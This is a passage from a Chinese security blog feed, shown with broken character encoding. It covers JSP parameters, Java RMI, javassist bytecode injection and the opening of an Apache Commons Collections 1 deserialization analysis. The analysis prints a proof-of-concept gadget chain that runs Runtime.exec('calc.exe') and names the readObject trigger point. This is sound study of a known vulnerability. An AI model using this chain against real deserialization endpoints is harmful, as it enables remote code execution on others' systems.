alt="QQæˆªå›¾20210219152143"></p><p>è‡³äºrequestå’Œresponseï¼Œè¿™ä¿©ç”¨çš„æ˜¯æœ€å¤šçš„æ˜¯ä»–ä»¬ï¼Œ<br>outå¯¹è±¡ä¸»è¦ç”¨äºåœ¨responseä¸­å†™å…¥è¾“å‡ºå†…å®¹ï¼Œ out.printlnæˆ–è€…out.printç”¨äºè¾“å‡ºå†…å®¹ï¼Œout.flushç”¨äºåˆ·æ–°è¾“å‡ºæµ,å…¶ä½™åœ¨æ–°æ‰‹é˜¶æ®µéƒ½ä¸å’‹ç”¨ã€‚</p><h4 id="ä¼ å‚å¤„ç†"><a href="#ä¼ å‚å¤„ç†" class="headerlink" title="ä¼ å‚å¤„ç†"></a>ä¼ å‚å¤„ç†</h4><ul><li><strong>getParameter():</strong> ä½¿ç”¨ request.getParameter() æ–¹æ³•æ¥è·å–è¡¨å•å‚æ•°çš„å€¼ã€‚</li><li><strong>getParameterValues():</strong> è·å¾—å¦‚checkboxç±»ï¼ˆåå­—ç›¸åŒï¼Œä½†å€¼æœ‰å¤šä¸ªï¼‰çš„æ•°æ®ã€‚ æ¥æ”¶æ•°ç»„å˜é‡ ï¼Œå¦‚checkboxç±»å‹</li><li>**getParameterNames():**è¯¥æ–¹æ³•å¯ä»¥å–å¾—æ‰€æœ‰å˜é‡çš„åç§°ï¼Œè¯¥æ–¹æ³•è¿”å›ä¸€ä¸ª Enumerationã€‚</li><li>**getInputStream():**è°ƒç”¨æ­¤æ–¹æ³•æ¥è¯»å–æ¥è‡ªå®¢æˆ·ç«¯çš„äºŒè¿›åˆ¶æ•°æ®æµã€‚</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;test jsp&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">your name is &lt;%&#x3D;request.getParameter(&quot;name&quot;)%&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152207.png" alt="QQæˆªå›¾20210219152207"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152242.png" alt="QQæˆªå›¾20210219152242"></p><h3 id="cookie-amp-session-1"><a href="#cookie-amp-session-1" class="headerlink" title="cookie&amp;session"></a>cookie&amp;session</h3><h4 id="cookieï¼Œsessionåœ¨JSPé‡Œçš„è®¾ç½®ä¸servletå¦‚å‡ºä¸€è¾™"><a href="#cookieï¼Œsessionåœ¨JSPé‡Œçš„è®¾ç½®ä¸servletå¦‚å‡ºä¸€è¾™" class="headerlink" title="cookieï¼Œsessionåœ¨JSPé‡Œçš„è®¾ç½®ä¸servletå¦‚å‡ºä¸€è¾™"></a>cookieï¼Œsessionåœ¨JSPé‡Œçš„è®¾ç½®ä¸servletå¦‚å‡ºä¸€è¾™</h4><p>cookieå’Œsessionåœ¨jspçš„&lt;%%&gt;ä»£ç åŒºé‡Œè®¾ç½®ï¼Œè®¾ç½®æ–¹æ³•ä¸servletå¦‚å‡ºä¸€è¾™ï¼Œå› ä¸º&lt;%%&gt;ä»£ç åŒºé‡Œæœ¬èº«å°±æ˜¯è°ƒç”¨çš„javaä»£ç ï¼Œæ‰€ä»¥ä¸å†èµ˜è¿°</p><h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><h2 id="ä½•ä¸ºRMI"><a href="#ä½•ä¸ºRMI" class="headerlink" title="ä½•ä¸ºRMI"></a>ä½•ä¸ºRMI</h2><p>RMIï¼Œå³è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œå…è®¸è¿è¡Œåœ¨ä¸€ä¸ªJAVAè™šæ‹Ÿæœºè°ƒç”¨å¦ä¸€ä¸ªJAVAè™šæ‹Ÿæœºä¸Šçš„å¯¹è±¡çš„æ–¹æ³•.</p><h2 id="RMI-å®ç°ä¸€ä¸ªè¿œç¨‹æ¥å£"><a href="#RMI-å®ç°ä¸€ä¸ªè¿œç¨‹æ¥å£" class="headerlink" title="RMI:å®ç°ä¸€ä¸ªè¿œç¨‹æ¥å£"></a>RMI:å®ç°ä¸€ä¸ªè¿œç¨‹æ¥å£</h2><p>RMIçš„è¿œç¨‹æ¥å£ç”¨äºå…¶ä»–javaè™šæ‹Ÿæœºè¿œç¨‹è°ƒç”¨è¯¥æ¥å£ä¸‹çš„å¯¹è±¡çš„æ–¹æ³•.</p><h3 id="å®šä¹‰ä¸€ä¸ªè¿œç¨‹æ¥å£"><a href="#å®šä¹‰ä¸€ä¸ªè¿œç¨‹æ¥å£" class="headerlink" title="å®šä¹‰ä¸€ä¸ªè¿œç¨‹æ¥å£"></a>å®šä¹‰ä¸€ä¸ªè¿œç¨‹æ¥å£</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.rmi.Remote;   &#x2F;&#x2F;å¼•å…¥Remoteæ¥å£</span><br><span class="line">public interface IHello extends Remote&#123;  &#x2F;&#x2F;å®ç°ä¸€ä¸ªRemoteæ¥å£</span><br><span class="line">  public String sayHello(String name) throws java.rmi.RemoteException;</span><br><span class="line">&#x2F;&#x2F;è‹¥æ˜¯Remoteæ¥å£é‡ŒæŸä¸ªæ–¹æ³•æŠ›å‡ºRemoteExceptionå¼‚å¸¸,å°±æ„å‘³ç€è¿™æ˜¯ä¸€ä¸ªå¯ä»¥è¢«è¿œç¨‹è°ƒç”¨çš„æ–¹æ³•,ä½†ç›®å‰è¿™ä¸ªæ–¹æ³•è¿˜æœªè¢«å…·ä½“å®ç°.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è¿œç¨‹æ¥å£çš„å®ç°ç±»"><a href="#è¿œç¨‹æ¥å£çš„å®ç°ç±»" class="headerlink" title="è¿œç¨‹æ¥å£çš„å®ç°ç±»"></a>è¿œç¨‹æ¥å£çš„å®ç°ç±»</h3><p>åˆšåˆšæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªRemoteæ¥å£,ä½†æ˜¯ä»–çš„æ–¹æ³•è¿˜æœªå…·ä½“å®ç°.æˆ‘ä»¬å°±æ¥å®ç°è¿œç¨‹æ¥å£çš„å®ç°ç±»å§</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line">public class HelloImpl extends UnicastRemoteObject implements IHello&#123; &#x2F;&#x2F;å®šä¹‰ä¸€ä¸ªè¿œç¨‹æ¥å£å®ç°ç±»,æ³¨æ„è¿™ä¸ªè¿œç¨‹å®ç°ç±»å¿…é¡»ç»§æ‰¿è‡ªUnicastRemoteObject,ä¸ç„¶æœåŠ¡ç«¯ä¸ä¼šå‘é€è¯¥ç±»çš„å¯¹è±¡çš„å­˜æ ¹(stub(ä¸‹æ–‡è®²))</span><br><span class="line">    protected HelloImpl throws RemoteException&#123;&#x2F;&#x2F;å¿…é¡»è¦æœ‰ä¸€ä¸ªæŠ›å‡ºRemoteExceptionå¼‚å¸¸çš„æ˜¾ç¤ºæ„é€ å‡½æ•°</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line">    public String sayHello(String name) throws RemoteException&#123;</span><br><span class="line">        return &quot;Hello&quot;+name;    &#x2F;&#x2F;å®šä¹‰å®ç°ç±»æ–¹æ³•çš„å…·ä½“ä»£ç </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ä¸¤å°JVMé€šè®¯çš„ç¬¬ä¸€æ­¥-RMI-Registry"><a href="#ä¸¤å°JVMé€šè®¯çš„ç¬¬ä¸€æ­¥-RMI-Registry" class="headerlink" title="ä¸¤å°JVMé€šè®¯çš„ç¬¬ä¸€æ­¥:RMI Registry"></a>ä¸¤å°JVMé€šè®¯çš„ç¬¬ä¸€æ­¥:RMI Registry</h2><p>ä½•ä¸ºRMI Registry<br>å¯ä»¥ç†è§£ä¸ºéƒ¨ç½²åœ¨è¢«è¿œç¨‹è°ƒç”¨çš„JAVAè™šæ‹Ÿæœºä¸Šçš„ä¸€ä¸ªåº”ç”¨,ç”¨äºå°†stubç»‘å®šåˆ°RegistryæœåŠ¡çš„URLä¸Šã€‚</p><p>æœåŠ¡ç«¯ç»‘å®šstubåˆ°æŒ‡å®šurl</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.rmi.Naming.rebind(&quot;rmi:&#x2F;&#x2F;localhost:1099&#x2F;hello&quot;, hello);   </span><br><span class="line">&#x2F;&#x2F;å¦‚æ­¤å¤„å°±æ˜¯æŠŠhelloè¿™ä¸ªå¯¹è±¡ç»‘å®šåœ¨äº†rmi:&#x2F;&#x2F;localhost:1099&#x2F;helloè¿™ä¸ªURL</span><br></pre></td></tr></table></figure><p>éšåå®¢æˆ·ç«¯æƒ³è¦è¿œç¨‹è°ƒç”¨helloè¿™ä¸ªå¯¹è±¡çš„æ–¹æ³•æ—¶ï¼Œå°±éœ€</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IHello hello &#x3D; (IHello) Naming.lookup(&quot;rmi:&#x2F;&#x2F;localhost:1099&#x2F;hello&quot;);</span><br><span class="line">&#x2F;&#x2F;æ­¤åˆ»å®¢æˆ·ç«¯æŸ¥æ‰¾å‡ºäº†helloå¯¹è±¡çš„stubæ‰€åœ¨url,æœåŠ¡ç«¯è¿”å›helloå¯¹è±¡çš„Stub</span><br><span class="line">&#x2F;&#x2F;æ­¤æ—¶çš„æ•°æ®ç±»å‹ä¼¼ä¹å¿…é¡»æ˜¯æ¥å£ç±»</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152319.png" alt="QQæˆªå›¾20210219152319"></p><h2 id="Stubå’ŒSkeleton"><a href="#Stubå’ŒSkeleton" class="headerlink" title="Stubå’ŒSkeleton"></a>Stubå’ŒSkeleton</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152334.png" alt="QQæˆªå›¾20210219152334"></p><p>ç”±ä¸Šæ–‡å¯çŸ¥å½“å®¢æˆ·æœºè¿œç¨‹è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶,è¿”å›çš„å…¶å®ä¸æ˜¯å¯¹è±¡æœ¬èº«,è€Œæ˜¯stub.<br>ä½ å¯ä»¥ç†è§£stubä¸ºä¸€ä¸ªä¸­ç»§ç«™ï¼Œå½“å®¢æˆ·æœºè°ƒç”¨è¯¥å¯¹è±¡æŸä¸ªæ–¹æ³•æ—¶,å®é™…ä¸Šæ˜¯é€šè¿‡stubä»¥socketçš„æ–¹å¼å‘æœåŠ¡å™¨ç«¯çš„skeletonå‘é€åºåˆ—åŒ–å¤„ç†çš„æ–¹æ³•åå’Œå‚æ•°ï¼ˆskeletonå¯ä»¥ç†è§£ä¸ºæœåŠ¡å™¨ç«¯ä¸Šçš„çœŸå®å¯¹è±¡)<br>æœåŠ¡ç«¯çš„skeletionååºåˆ—åŒ–å¾—åˆ°çš„æ–¹æ³•åå’Œå‚æ•°å¹¶å¤„ç†åå†ä»¥socketçš„æ–¹å¼æŠŠè¯¥æ–¹æ³•ç”Ÿæˆçš„ç»“æœä¼ å›stub,stubå†æŠŠæ•°æ®è¿”å›ç»™å®¢æˆ·æœº</p><h2 id="ä»£ç å®ç°è¿œç¨‹è°ƒç”¨"><a href="#ä»£ç å®ç°è¿œç¨‹è°ƒç”¨" class="headerlink" title="ä»£ç å®ç°è¿œç¨‹è°ƒç”¨"></a>ä»£ç å®ç°è¿œç¨‹è°ƒç”¨</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æœåŠ¡å™¨ç«¯</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.registry.*;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">interface Hello extends Remote&#123;</span><br><span class="line">    public String sayHello(String name) throws RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class HelloImpl extends UnicastRemoteObject implements Hello&#123;</span><br><span class="line">    protected HelloImpl()throws RemoteException &#123;</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line">    public String sayHello(String name) throws RemoteException&#123;</span><br><span class="line">        return &quot;Hello&quot;+name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">public class Server&#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">    try&#123;&#x2F;&#x2F;å¿…é¡»æœ‰try..catch</span><br><span class="line">        Hello hello &#x3D; new HelloImpl();  &#x2F;&#x2F;ä¼¼ä¹æ•°æ®ç±»å‹åªèƒ½æ˜¯æ¥å£ç±»</span><br><span class="line">        LocateRegistry.createRegistry(1080);  &#x2F;&#x2F;å°†RMI registryçš„ç«¯å£è®¾ç½®ä¸º1080</span><br><span class="line">        java.rmi.Naming.rebind(&quot;rmi:&#x2F;&#x2F;localhost:1080&#x2F;hello&quot;, hello);&#x2F;&#x2F;</span><br><span class="line">å°†helloè¿™ä¸ªæ–¹æ³•å¯¹è±¡ç»‘å®šåœ¨æŒ‡å®šurlä¸Š,rmiåè®®</span><br><span class="line">        System.out.print(&quot;OK&quot;);</span><br><span class="line">    &#125;catch(Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">å®¢æˆ·æœºç«¯</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.registry.*;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line">import java.rmi.Naming;</span><br><span class="line">public class Client&#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        try&#123;&#x2F;&#x2F;å¿…é¡»æœ‰try..catch</span><br><span class="line">        Hello hello_client &#x3D; (Hello) Naming.lookup(&quot;rmi:&#x2F;&#x2F;localhost:1080&#x2F;hello&quot;);  &#x2F;&#x2F;æœåŠ¡å™¨ç«¯ç»‘å®šåœ¨è¯¥urlçš„å¯¹è±¡æ•°æ®ç±»å‹æ˜¯Helloï¼Œæ‰€ä»¥è¿™é‡Œçš„æ•°æ®ç±»å‹ä¹Ÿæ˜¯Hello</span><br><span class="line">        System.out.print(hello_client.sayHello(&quot;fuck&quot;));</span><br><span class="line">        &#125;catch(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»“æœ</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152343.png" alt="QQæˆªå›¾20210219152343"></p><h1 id="javassist"><a href="#javassist" class="headerlink" title="javassist"></a>javassist</h1><p>javassist æ˜¯ä¸€ä¸ªç±»åº“ï¼Œç”¨äºæ“ä½œjavaå­—èŠ‚ç ã€‚</p><p>æ¯”å¦‚æˆ‘ä»¬æ¥ä¸‹æ¥å°±ä¼šä½¿ç”¨javassistæ¥åŠ¨æ€æ“ä½œå­—èŠ‚ç ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test2.java</span><br><span class="line">public class test2 &#123;</span><br><span class="line">    public void gogo()&#123;</span><br><span class="line">        System.out.println(&quot;yuansheng&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test1.java</span><br><span class="line">import javassist.*;</span><br><span class="line">public class test1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        ClassPool pool &#x3D; ClassPool.getDefault();</span><br><span class="line">        CtClass class1 &#x3D; pool.get(test2.class.getName());</span><br><span class="line">        String cmd &#x3D; &quot;System.out.print(\&quot;hello\&quot;);&quot;;</span><br><span class="line">        class1.makeClassInitializer().insertBefore(cmd);  \\æ’å…¥staticé™æ€ä»£ç å—ï¼Œå†…å®¹ä¸ºcmdä¸­å†…å®¹</span><br><span class="line">        class1.setName(&quot;class1&quot;);  \\ä¸ºæ–°ç±»å‘½åä¸ºclass1</span><br><span class="line">        class1.writeFile(&quot;d:\\test&quot;);  \\å°†ç±»å†™å…¥d:\\testæ–‡ä»¶å¤¹</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åç¼–è¯‘d:\\test\\class1.class</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="line">&#x2F;&#x2F; (powered by FernFlower decompiler)</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">public class class1 &#123;</span><br><span class="line">    public class1() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void gogo() &#123;</span><br><span class="line">        System.out.println(&quot;yuansheng&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line">        System.out.print(&quot;hello&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°æˆ‘ä»¬å·²ç»å¾€test2.javaçš„å†…å®¹ä¸­æ’å…¥äº†è¾“å‡ºhelloçš„é™æ€ä»£ç å—ï¼Œå¹¶ä»¥class1.classå†™å…¥d:\\testæ–‡ä»¶å¤¹ã€‚</p><p>javassistçš„åŠŸèƒ½é™¤æ­¤ä¹‹å¤–è¿˜æœ‰å¾ˆå¤š</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;java-ä»£ç†&quot;&gt;&lt;a href=&quot;#java-ä»£ç†&quot; class=&quot;headerlink&quot; title=&quot;java ä»£ç†&quot;&gt;&lt;/a&gt;java ä»£ç†&lt;/h1&gt;&lt;p&gt;ä»£ç†çš„ä½œç”¨ï¼Œå°±æ˜¯åœ¨åŸæœ‰ç±»çš„ä»£ç ä¸å‘ç”Ÿæ”¹åŠ¨çš„æƒ…å†µä¸‹ï¼Œæ·»åŠ æ–°åŠŸèƒ½ã€‚èµ·åˆ°ä¸€ä¸ªä¿®é¥°å™¨çš„ä½œç”¨ã€‚&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    
    <category term="javaå¼€å‘ä¸å®‰å…¨" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Apache-Commons-Collections1 ååºåˆ—åŒ–åˆ†æ</title>
    <link href="http://const27.com/2021/06/28/Apache-Commons-Collections1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
    <id>http://const27.com/2021/06/28/Apache-Commons-Collections1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</id>
    <published>2021-06-28T13:51:11.039Z</published>
    <updated>2021-06-28T13:47:27.546Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Transformer-Map-é“¾"><a href="#Transformer-Map-é“¾" class="headerlink" title="Transformer Map é“¾"></a>Transformer Map é“¾</h2><h3 id="RCEåŸç†"><a href="#RCEåŸç†" class="headerlink" title="RCEåŸç†"></a>RCEåŸç†</h3><p>æˆ‘åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†ä¸€åˆ™åˆ©ç”¨ä»£ç ï¼Œè™½ç„¶è¿™ä¸ªåˆ©ç”¨ä»£ç å¾ˆç²—æµ…ï¼Œå¹¶æ²¡æœ‰CCé“¾1çš„è§¦å‘è¿‡ç¨‹ï¼Œä½†æ˜¯å¯¹äºè¿™æ¡é“¾çš„åŸç†è¿˜æ˜¯å¯è§ä¸€æ–‘çš„ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers &#x3D; new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,</span><br><span class="line">                        new Object[]</span><br><span class="line">                                &#123;&quot;calc.exe&quot;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain &#x3D; new</span><br><span class="line">                ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap &#x3D; new HashMap();</span><br><span class="line">        Map outerMap &#x3D; TransformedMap.decorate(innerMap, null,</span><br><span class="line">                transformerChain);</span><br><span class="line">        outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="TransformerMapç±»"><a href="#TransformerMapç±»" class="headerlink" title="TransformerMapç±»"></a>TransformerMapç±»</h4><p>TransformerMapç±»æ˜¯é€ æˆè¿™ä¸ªæ¼æ´çš„åŸå› ä¹‹ä¸€</p><p>TransformerMapæ˜¯apacheCommonsCollectionsé‡Œæä¾›çš„ä¸€ä¸ªæ•°æ®ç±»å‹ã€‚å®ƒå¯ä»¥ä¿®é¥°ä¸€ä¸ªMapç±»å‹çš„å¯¹è±¡ã€‚å½“ä¿®é¥°è¿‡çš„Mapæ·»åŠ æ–°å…ƒç´ æ—¶ï¼Œå®ƒä¼šè°ƒç”¨åœ¨decorateé‡Œå£°æ˜å¥½çš„Trasnformerç±»çš„transformæ–¹æ³•å¹¶ä¼ å…¥æ–°æ·»çš„é”®åæˆ–å€¼åã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Map DecoratedMap &#x3D; TransformedMap.decorateï¼ˆMap,keyTransformer,</span><br><span class="line">valueTransformerï¼‰</span><br></pre></td></tr></table></figure><p>keyTransformerå’ŒvalueTransformeråˆ†åˆ«æŒ‡å‘ä¸åŒçš„Transformerç±»ã€‚</p><h4 id="Transformerç±»"><a href="#Transformerç±»" class="headerlink" title="Transformerç±»"></a>Transformerç±»</h4><p>æˆ‘ä»¬çœ‹ä¸€ä¸‹Transformerç±»</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150055.png" alt="QQæˆªå›¾20210217150055"></p><p>å¯ä»¥å‘ç°å®ƒåªæ˜¯ä¸€ä¸ªå€Ÿå£ï¼Œä»–çš„æ–¹æ³•éœ€è¦å…¶ä»–å­ç±»å®ç°ã€‚<br>å½“TransformerMapåœ¨æ–°æ·»å…ƒç´ æ—¶å°±ä¼šè°ƒç”¨decorateé‡Œè®¾å®šå¥½çš„Transformerç±»çš„transformæ–¹æ³•ã€‚<br>å®ƒçš„æ¥å£å®ç°ç±»æœ‰ä»¥ä¸‹å‡ ä¸ªã€‚</p><h5 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h5><p>è¿™ä¸ªç±»ä¸»è¦çš„ä¸¤ä¸ªæ–¹æ³•å°±æ˜¯è¿™ä¿©äº†ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public ConstantTransformer(Object constantToReturn) &#123;</span><br><span class="line">        this.iConstant &#x3D; constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Object transform(Object input) &#123;</span><br><span class="line">        return this.iConstant;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œå°±æ˜¯æŠŠä¼ å…¥çš„å¯¹è±¡åŸåŸæœ¬æœ¬è¿”å›ã€‚</p><h5 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h5><p>ä¹Ÿæ˜¯ä¸¤ä¸ªé‡è¦æ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span><br><span class="line">        this.iMethodName &#x3D; methodName;</span><br><span class="line">        this.iParamTypes &#x3D; paramTypes;</span><br><span class="line">        this.iArgs &#x3D; args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Object transform(Object input) &#123;</span><br><span class="line">        if (input &#x3D;&#x3D; null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Class cls &#x3D; input.getClass();</span><br><span class="line">                Method method &#x3D; cls.getMethod(this.iMethodName, this.iParamTypes);</span><br><span class="line">                return method.invoke(input, this.iArgs);</span><br><span class="line">            &#125; catch (NoSuchMethodException var5) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; does not exist&quot;);</span><br><span class="line">            &#125; catch (IllegalAccessException var6) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; cannot be accessed&quot;);</span><br><span class="line">            &#125; catch (InvocationTargetException var7) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; threw an exception&quot;, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å°±æ˜¯ä¼ å…¥æ–¹æ³•åï¼Œå‚æ•°ç±»å‹å’Œå‚æ•°ï¼Œç„¶åé€šè¿‡åå°„æ¥æ‰§è¡Œè¿™ä¸ªæ–¹æ³•</p><h5 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h5><p>ä¹Ÿæ˜¯ä¸¤ä¸ªé‡è¦æ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public ChainedTransformer(Transformer[] transformers) &#123;</span><br><span class="line">     this.iTransformers &#x3D; transformers;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> public Object transform(Object object) &#123;</span><br><span class="line">     for(int i &#x3D; 0; i &lt; this.iTransformers.length; ++i) &#123;</span><br><span class="line">         object &#x3D; this.iTransformers[i].transform(object);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     return object;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>å°±æ˜¯æŠŠä¼ å…¥çš„å¤šä¸ªTransfomerç±»çš„transformeræ–¹æ³•ä¾æ¬¡æ‰§è¡Œï¼Œæ¯ä¸ªtransformeræ–¹æ³•æ‰§è¡Œåè¿”å›çš„å¯¹è±¡ä¼šè¢«å½“åšä¸‹ä¸€æ¬¡æ‰§è¡Œçš„æ—¶å€™ä¼ å…¥çš„å‚æ•°ã€‚</p><p>é€šè¿‡ä»¥ä¸Šä¿¡æ¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ¸…æ™°çš„çœ‹æ‡‚ä¸Šé¢çš„payloadäº†ã€‚<br>å…ˆé€šè¿‡ConstantTransformerè·å¾— Runtimeç±»ï¼Œå†é€šè¿‡InvokerTransformeræ‰§è¡Œexecæ–¹æ³•ï¼Œç„¶åé€šè¿‡ChainedTransformerå°†ä¸¤ä¸ªç±»ä¸²èµ·æ¥ï¼Œè®©InvokerTransformerä»¥ConstantTrasformerè¿”å›çš„Runtimeç±»ä¸ºå‚æ•°æ‰§è¡Œexecæ–¹æ³•ï¼Œè¾¾åˆ°RCEçš„ç›®çš„ã€‚</p><h3 id="è§¦å‘"><a href="#è§¦å‘" class="headerlink" title="è§¦å‘"></a>è§¦å‘</h3><p>è§¦å‘ï¼Œæˆ‘ä»¬é€‰æ‹©çš„åœ°æ–¹æ˜¯sun.reflect.annotation.AnnotationInvocationHandlerçš„readObjectæ–¹æ³•ï¼Œååºåˆ—åŒ–çš„å…¥å£ç‚¹åŸºæœ¬éƒ½åœ¨è¿™é‡Œï¼šreadobjcectæ–¹æ³•ã€‚ï¼ˆæ³¨æ„8u71ä»¥ä¸‹æ‰èƒ½æœ‰è§¦å‘ç‚¹ï¼Œä¹‹åçš„ç‰ˆæœ¬å·²è¢«ä¿®å¤ï¼‰</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150130.png" alt="QQæˆªå›¾20210217150130"></p><p>è§¦å‘ç‚¹ä»£ç ã€‚<br>æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå®ƒå¯¹ä¼ 